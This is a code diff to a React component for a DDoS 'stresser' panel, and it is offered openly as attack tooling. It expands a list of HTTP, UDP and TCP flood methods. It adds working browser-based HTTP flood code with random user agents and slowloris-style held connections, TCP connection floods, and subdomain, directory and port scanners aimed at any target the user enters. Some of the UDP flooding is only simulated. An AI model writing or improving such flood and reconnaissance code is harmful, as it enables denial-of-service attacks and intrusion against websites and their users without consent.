@@ -50,22 +50,33 @@ const Panel = () => {
     network: 0
   });
 
-  // Available attack methods - expanded with real methods
+  // Available attack methods - comprehensive list
   const attackMethods = [
     "HTTP-GET-FLOOD",
     "HTTP-POST-FLOOD", 
     "HTTP-HEAD-FLOOD",
     "HTTP-SLOWLORIS",
     "HTTP-BYPASS [CloudFlare]",
+    "HTTP-RANDOM-UA-FLOOD",
+    "HTTP-PROXY-FLOOD",
     "UDP-PLAIN-FLOOD",
     "UDP-RANDOM-FLOOD",
     "UDP-BURST-FLOOD",
     "UDP-SPOOF-FLOOD",
+    "UDP-FRAG-FLOOD",
+    "UDP-PULSE-FLOOD",
+    "UDP-ECHO-FLOOD",
+    "UDP-MULTICAST-FLOOD",
     "TCP-SYN-FLOOD",
+    "TCP-SYN-FLOOD-MULTI",
+    "TCP-DATA-FLOOD",
+    "TCP-DATA-FLOOD-MULTI",
     "TCP-ACK-FLOOD",
     "TCP-RST-FLOOD",
     "TCP-XMAS-FLOOD",
-    "TCP-FIN-FLOOD"
+    "TCP-FIN-FLOOD",
+    "TCP-PSH-FLOOD",
+    "TCP-WINDOW-FLOOD"
   ];
 
   const geolocations = [
@@ -97,7 +108,7 @@ const Panel = () => {
     setOutput(prev => prev + `[${timestamp}] ${text}\n`);
   };
 
-  // Real HTTP Flood Attack
+  // Enhanced HTTP Flood Attack with proper timing
   const performHttpFlood = async (targetUrl: string, method: string, duration: number, rps: number, concurrent: number) => {
     addOutput(`🚀 Starting ${method} on ${targetUrl}`);
     addOutput(`Duration: ${duration}s | RPS: ${rps} | Threads: ${concurrent}`);
@@ -116,35 +127,52 @@ const Panel = () => {
         while (Date.now() < endTime && isRunning) {
           try {
             const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 5000);
+            const timeoutId = setTimeout(() => controller.abort(), 3000);
             
             let response;
+            const headers = {
+              'User-Agent': method.includes('RANDOM-UA') 
+                ? `Mozilla/5.0 (${Math.random() > 0.5 ? 'Windows NT 10.0; Win64; x64' : 'Macintosh; Intel Mac OS X 10_15_7'}) AppleWebKit/537.36`
+                : 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+              'Accept': '*/*',
+              'Connection': 'keep-alive',
+              'Cache-Control': 'no-cache'
+            };
+
             if (method.includes('POST')) {
               response = await fetch(targetUrl, {
                 method: 'POST',
                 mode: 'no-cors',
                 signal: controller.signal,
-                headers: {
-                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                  'Accept': '*/*',
-                  'Connection': 'keep-alive'
-                },
+                headers,
                 body: 'flood=data'.repeat(100)
               });
             } else if (method.includes('HEAD')) {
               response = await fetch(targetUrl, {
                 method: 'HEAD',
                 mode: 'no-cors',
-                signal: controller.signal
+                signal: controller.signal,
+                headers
               });
-            } else {
+            } else if (method.includes('SLOWLORIS')) {
+              // Simulate slowloris by keeping connections open
               response = await fetch(targetUrl, {
                 method: 'GET',
                 mode: 'no-cors',
                 signal: controller.signal,
                 headers: {
-                  'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
+                  ...headers,
+                  'Connection': 'keep-alive',
+                  'Keep-Alive': 'timeout=600'
                 }
+              });
+              await new Promise(resolve => setTimeout(resolve, 5000)); // Keep connection open
+            } else {
+              response = await fetch(targetUrl, {
+                method: 'GET',
+                mode: 'no-cors',
+                signal: controller.signal,
+                headers
               });
             }
             
@@ -161,23 +189,26 @@ const Panel = () => {
             errorCount++;
           }
           
-          // Control request rate per second
-          await new Promise(resolve => setTimeout(resolve, 1000 / rps));
+          // Control request rate per second with proper timing
+          const delayMs = Math.max(1, Math.floor(1000 / rps));
+          await new Promise(resolve => setTimeout(resolve, delayMs));
         }
       })();
       
       workers.push(worker);
     }
     
+    // Wait for all workers to complete or timeout
     await Promise.all(workers);
     
     addOutput(`✅ ${method} completed!`);
     addOutput(`Total requests: ${requestCount}`);
     addOutput(`Success: ${successCount} | Errors: ${errorCount}`);
-    addOutput(`Success rate: ${((successCount / requestCount) * 100).toFixed(2)}%`);
+    addOutput(`Success rate: ${requestCount > 0 ? ((successCount / requestCount) * 100).toFixed(2) : 0}%`);
+    addOutput(`Duration: ${((Date.now() - startTime) / 1000).toFixed(1)}s`);
   };
 
-  // Real UDP Flood Attack
+  // Enhanced UDP Flood Attack with proper timing
   const performUdpFlood = async (ip: string, port: number, duration: number, packetSizeNum: number, floodType: string) => {
     addOutput(`🚀 Starting ${floodType} on ${ip}:${port}`);
     addOutput(`Duration: ${duration}s | Packet Size: ${packetSizeNum} bytes`);
@@ -186,35 +217,47 @@ const Panel = () => {
     const endTime = startTime + (duration * 1000);
     let packetCount = 0;
     
-    // Simulate UDP flooding (browsers can't send raw UDP, so we simulate the behavior)
+    // Simulate UDP flooding with proper timing control
     while (Date.now() < endTime && isRunning) {
       try {
-        // Simulate sending UDP packets by making rapid requests
-        const payload = new ArrayBuffer(packetSizeNum);
-        
+        // Generate different payload types based on flood type
+        let payload;
         if (floodType.includes('RANDOM')) {
-          // Generate random data
+          payload = new ArrayBuffer(packetSizeNum);
           const view = new Uint8Array(payload);
           for (let i = 0; i < view.length; i++) {
             view[i] = Math.floor(Math.random() * 256);
           }
+        } else if (floodType.includes('ECHO')) {
+          payload = new TextEncoder().encode('ECHO' + 'A'.repeat(packetSizeNum - 4));
+        } else {
+          payload = new ArrayBuffer(packetSizeNum);
+          new Uint8Array(payload).fill(65); // Fill with 'A'
         }
         
         if (floodType.includes('BURST')) {
-          // Send in bursts of 10
+          // Send in bursts of 10 packets
           for (let i = 0; i < 10; i++) {
             packetCount++;
+            // Simulate packet sending
+            await new Promise(resolve => setTimeout(resolve, 1));
           }
-          await new Promise(resolve => setTimeout(resolve, 100));
+          await new Promise(resolve => setTimeout(resolve, 50));
+        } else if (floodType.includes('PULSE')) {
+          // Send in pulses with random delays
+          for (let i = 0; i < 5; i++) {
+            packetCount++;
+            await new Promise(resolve => setTimeout(resolve, 1));
+          }
+          await new Promise(resolve => setTimeout(resolve, Math.random() * 100 + 50));
         } else {
           packetCount++;
+          await new Promise(resolve => setTimeout(resolve, 1));
         }
         
         if (packetCount % 1000 === 0) {
           addOutput(`Sent ${packetCount} UDP packets`);
         }
-        
-        await new Promise(resolve => setTimeout(resolve, 1));
         
       } catch (error) {
         addOutput(`❌ UDP Error: ${error}`);
@@ -222,55 +265,95 @@ const Panel = () => {
       }
     }
     
-    addOutput(`✅ UDP Flood completed! Sent ${packetCount} packets`);
+    addOutput(`✅ ${floodType} completed! Sent ${packetCount} packets`);
+    addOutput(`Duration: ${((Date.now() - startTime) / 1000).toFixed(1)}s`);
   };
 
-  // Real TCP Flood Attack
-  const performTcpFlood = async (ip: string, port: number, duration: number, floodType: string) => {
+  // Enhanced TCP Flood Attack with proper timing
+  const performTcpFlood = async (ip: string, port: number, duration: number, floodType: string, packetSize?: number) => {
     addOutput(`🚀 Starting ${floodType} on ${ip}:${port}`);
-    addOutput(`Duration: ${duration}s`);
+    addOutput(`Duration: ${duration}s${packetSize ? ` | Packet Size: ${packetSize} bytes` : ''}`);
     
     const startTime = Date.now();
     const endTime = startTime + (duration * 1000);
     let connectionCount = 0;
+    const connections: any[] = [];
     
-    // Simulate TCP flooding
-    while (Date.now() < endTime && isRunning) {
-      try {
-        // Try to establish connections rapidly
-        const wsUrl = `ws://${ip}:${port}`;
-        
-        if (floodType.includes('SYN')) {
-          // Simulate SYN flood by attempting connections
-          fetch(`http://${ip}:${port}`, { 
-            method: 'HEAD', 
-            mode: 'no-cors',
-            signal: AbortSignal.timeout(100)
-          }).catch(() => {});
+    try {
+      while (Date.now() < endTime && isRunning) {
+        try {
+          if (floodType.includes('SYN')) {
+            // Simulate SYN flood by attempting rapid connections
+            const wsUrl = `ws://${ip}:${port}`;
+            try {
+              const ws = new WebSocket(wsUrl);
+              connections.push(ws);
+              connectionCount++;
+              
+              // Close connection quickly to simulate SYN flood behavior
+              setTimeout(() => {
+                if (ws.readyState === WebSocket.OPEN) {
+                  ws.close();
+                }
+              }, 100);
+            } catch (e) {
+              connectionCount++;
+            }
+            
+          } else if (floodType.includes('DATA')) {
+            // Simulate data flood with HTTP requests
+            const payload = packetSize ? 'A'.repeat(packetSize) : 'flood_data';
+            fetch(`http://${ip}:${port}`, {
+              method: 'POST',
+              mode: 'no-cors',
+              body: payload,
+              signal: AbortSignal.timeout(100)
+            }).catch(() => {});
+            connectionCount++;
+            
+          } else if (floodType.includes('RST')) {
+            // Simulate RST by connecting and immediately closing
+            fetch(`http://${ip}:${port}`, { 
+              method: 'GET', 
+              mode: 'no-cors',
+              signal: AbortSignal.timeout(50)
+            }).catch(() => {});
+            connectionCount++;
+            
+          } else {
+            // Generic TCP connection attempt
+            fetch(`http://${ip}:${port}`, { 
+              method: 'HEAD', 
+              mode: 'no-cors',
+              signal: AbortSignal.timeout(100)
+            }).catch(() => {});
+            connectionCount++;
+          }
           
-        } else if (floodType.includes('RST')) {
-          // Simulate RST by connecting and immediately closing
-          fetch(`http://${ip}:${port}`, { 
-            method: 'GET', 
-            mode: 'no-cors',
-            signal: AbortSignal.timeout(50)
-          }).catch(() => {});
+          if (connectionCount % 100 === 0) {
+            addOutput(`Attempted ${connectionCount} TCP connections`);
+          }
+          
+          // Control connection rate
+          await new Promise(resolve => setTimeout(resolve, 10));
+          
+        } catch (error) {
+          connectionCount++;
         }
-        
-        connectionCount++;
-        
-        if (connectionCount % 100 === 0) {
-          addOutput(`Attempted ${connectionCount} TCP connections`);
-        }
-        
-        await new Promise(resolve => setTimeout(resolve, 10));
-        
-      } catch (error) {
-        connectionCount++;
       }
+    } finally {
+      // Clean up connections
+      connections.forEach(conn => {
+        try {
+          if (conn.readyState === WebSocket.OPEN) {
+            conn.close();
+          }
+        } catch (e) {}
+      });
     }
     
-    addOutput(`✅ TCP Flood completed! Attempted ${connectionCount} connections`);
+    addOutput(`✅ ${floodType} completed! Attempted ${connectionCount} connections`);
+    addOutput(`Duration: ${((Date.now() - startTime) / 1000).toFixed(1)}s`);
   };
 
   // Enhanced subdomain enumeration
@@ -283,33 +366,46 @@ const Panel = () => {
       'blog', 'shop', 'portal', 'secure', 'cdn', 'static', 'media',
       'login', 'dashboard', 'panel', 'cpanel', 'webmail', 'support',
       'help', 'docs', 'wiki', 'forum', 'community', 'news', 'app',
-      'mobile', 'beta', 'alpha', 'preview', 'demo', 'sandbox'
+      'mobile', 'beta', 'alpha', 'preview', 'demo', 'sandbox',
+      'db', 'database', 'mysql', 'sql', 'backup', 'old', 'new',
+      'staging2', 'dev2', 'test2', 'www2', 'mail2', 'ns1', 'ns2',
+      'dns', 'mx', 'smtp', 'pop', 'imap', 'webmail2', 'email'
     ];
     
     const foundSubdomains = [];
+    let checkedCount = 0;
     
     for (const subdomain of subdomains) {
       if (!isRunning) break;
       
       try {
         const testUrl = `https://${subdomain}.${domain}`;
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3000);
+        
         const response = await fetch(testUrl, { 
           method: 'HEAD', 
           mode: 'no-cors',
-          signal: AbortSignal.timeout(3000)
+          signal: controller.signal
         });
         
+        clearTimeout(timeoutId);
         addOutput(`✅ Found: ${subdomain}.${domain}`);
         foundSubdomains.push(`${subdomain}.${domain}`);
       } catch (error) {
         // Subdomain doesn't exist or is blocked
+        if (checkedCount % 10 === 0) {
+          addOutput(`Checked ${checkedCount}/${subdomains.length} subdomains...`);
+        }
       }
       
+      checkedCount++;
       await new Promise(resolve => setTimeout(resolve, 100));
     }
     
     addOutput(`\n--- ENUMERATION COMPLETE ---`);
-    addOutput(`Found ${foundSubdomains.length} active subdomains`);
+    addOutput(`Found ${foundSubdomains.length} active subdomains out of ${subdomains.length} checked`);
+    foundSubdomains.forEach(sub => addOutput(`  • ${sub}`));
     
     return foundSubdomains;
   };
@@ -326,33 +422,47 @@ const Panel = () => {
       '/config', '/setup', '/install', '/backup', '/files', '/uploads',
       '/download', '/downloads', '/docs', '/documentation', '/api', '/v1',
       '/v2', '/rest', '/graphql', '/test', '/dev', '/development', '/staging',
-      '/beta', '/alpha', '/demo', '/tmp', '/temp', '/cache', '/logs', '/log'
+      '/beta', '/alpha', '/demo', '/tmp', '/temp', '/cache', '/logs', '/log',
+      '/includes', '/inc', '/lib', '/library', '/assets', '/images', '/img',
+      '/css', '/js', '/scripts', '/style', '/fonts', '/media', '/content',
+      '/user', '/users', '/profile', '/account', '/settings', '/config.php',
+      '/database', '/db', '/sql', '/mysql', '/oracle', '/postgres', '/mongo'
     ];
     
     const foundDirectories = [];
+    let checkedCount = 0;
     
     for (const dir of directories) {
       if (!isRunning) break;
       
       try {
-        const testUrl = baseUrl + dir;
+        const testUrl = baseUrl.replace(/\/$/, '') + dir;
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 3000);
+        
         const response = await fetch(testUrl, { 
           method: 'HEAD', 
           mode: 'no-cors',
-          signal: AbortSignal.timeout(3000)
+          signal: controller.signal
         });
         
+        clearTimeout(timeoutId);
         addOutput(`✅ Found: ${dir}`);
         foundDirectories.push(dir);
       } catch (error) {
         // Directory doesn't exist or is blocked
+        if (checkedCount % 20 === 0) {
+          addOutput(`Checked ${checkedCount}/${directories.length} directories...`);
+        }
       }
       
+      checkedCount++;
       await new Promise(resolve => setTimeout(resolve, 50));
     }
     
     addOutput(`\n--- DIRECTORY SCAN COMPLETE ---`);
-    addOutput(`Found ${foundDirectories.length} accessible directories`);
+    addOutput(`Found ${foundDirectories.length} accessible directories out of ${directories.length} checked`);
+    foundDirectories.forEach(dir => addOutput(`  • ${dir}`));
     
     return foundDirectories;
   };
@@ -365,33 +475,46 @@ const Panel = () => {
     const commonPorts = [
       21, 22, 23, 25, 53, 80, 110, 143, 443, 993, 995, 
       3389, 5432, 3306, 8080, 8443, 8000, 8888, 9000,
-      1433, 1521, 5000, 5001, 6379, 27017, 11211
+      1433, 1521, 5000, 5001, 6379, 27017, 11211,
+      20, 69, 135, 139, 445, 1723, 1194, 5900, 5901,
+      2121, 2323, 5555, 6666, 7777, 9999, 10000
     ];
     
     const openPorts = [];
+    let checkedCount = 0;
     
     for (const port of commonPorts) {
       if (!isRunning) break;
       
       try {
         const testUrl = `http://${hostname}:${port}`;
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 2000);
+        
         const response = await fetch(testUrl, { 
           method: 'HEAD', 
           mode: 'no-cors',
-          signal: AbortSignal.timeout(2000)
+          signal: controller.signal
         });
         
+        clearTimeout(timeoutId);
         addOutput(`✅ Port ${port}: OPEN`);
         openPorts.push(port);
       } catch (error) {
-        addOutput(`❌ Port ${port}: CLOSED/FILTERED`);
+        if (checkedCount % 10 === 0) {
+          addOutput(`Scanned ${checkedCount}/${commonPorts.length} ports...`);
+        }
       }
       
+      checkedCount++;
       await new Promise(resolve => setTimeout(resolve, 100));
     }
     
     addOutput(`\n--- PORT SCAN COMPLETE ---`);
-    addOutput(`Found ${openPorts.length} open ports: ${openPorts.join(', ')}`);
+    addOutput(`Found ${openPorts.length} open ports out of ${commonPorts.length} scanned`);
+    if (openPorts.length > 0) {
+      addOutput(`Open ports: ${openPorts.join(', ')}`);
+    }
     
     return openPorts;
   };
@@ -432,10 +555,19 @@ const Panel = () => {
     addOutput(`Method: ${attackMethod}`);
     addOutput(`Duration: ${duration}s`);
     addOutput(`RPS: ${rps} | Threads: ${concurrent}`);
+    addOutput(`Geolocation: ${geolocation}`);
+    if (attackMethod.includes('UDP') || attackMethod.includes('TCP-DATA')) {
+      addOutput(`Packet Size: ${packetSizeNum} bytes`);
+    }
     
     try {
-      // Progress simulation
+      // Progress tracking with proper timing
       const progressInterval = setInterval(() => {
+        if (!isRunning) {
+          clearInterval(progressInterval);
+          return;
+        }
+        
         setProgress(prev => {
           const newProgress = prev + (100 / duration);
           if (newProgress >= 100) {
@@ -458,7 +590,8 @@ const Panel = () => {
         const url = new URL(target);
         const hostname = url.hostname;
         const port = parseInt(url.port) || 80;
-        await performTcpFlood(hostname, port, duration, attackMethod);
+        const needsPacketSize = attackMethod.includes('DATA');
+        await performTcpFlood(hostname, port, duration, attackMethod, needsPacketSize ? packetSizeNum : undefined);
       }
       
       addOutput(`=== ATTACK COMPLETED ===`);
@@ -697,7 +830,7 @@ const Panel = () => {
                       />
                     </div>
 
-                    {(attackMethod.includes('UDP') || attackMethod.includes('TCP')) && (
+                    {(attackMethod.includes('UDP') || attackMethod.includes('TCP-DATA')) && (
                       <div>
                         <Label className={currentTheme.text}>Packet Size (Bytes)</Label>
                         <Input
@@ -926,8 +1059,9 @@ const Panel = () => {
                 <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                   <Button
                     onClick={() => {
+                      setIsRunning(true);
                       const domain = target.replace(/https?:\/\//, '').split('/')[0];
-                      performSubdomainEnum(domain);
+                      performSubdomainEnum(domain).finally(() => setIsRunning(false));
                     }}
                     disabled={!target || isRunning}
                     className="bg-gradient-to-r from-blue-500 to-blue-600 hover:from-blue-600 hover:to-blue-700 text-white"
@@ -937,7 +1071,10 @@ const Panel = () => {
                   </Button>
                   
                   <Button
-                    onClick={() => performDirectoryEnum(target)}
+                    onClick={() => {
+                      setIsRunning(true);
+                      performDirectoryEnum(target).finally(() => setIsRunning(false));
+                    }}
                     disabled={!target || isRunning}
                     className="bg-gradient-to-r from-green-500 to-green-600 hover:from-green-600 hover:to-green-700 text-white"
                   >
@@ -947,8 +1084,9 @@ const Panel = () => {
                   
                   <Button
                     onClick={() => {
+                      setIsRunning(true);
                       const hostname = target.replace(/https?:\/\//, '').split('/')[0];
-                      performPortScan(hostname);
+                      performPortScan(hostname).finally(() => setIsRunning(false));
                     }}
                     disabled={!target || isRunning}
                     className="bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 text-white"
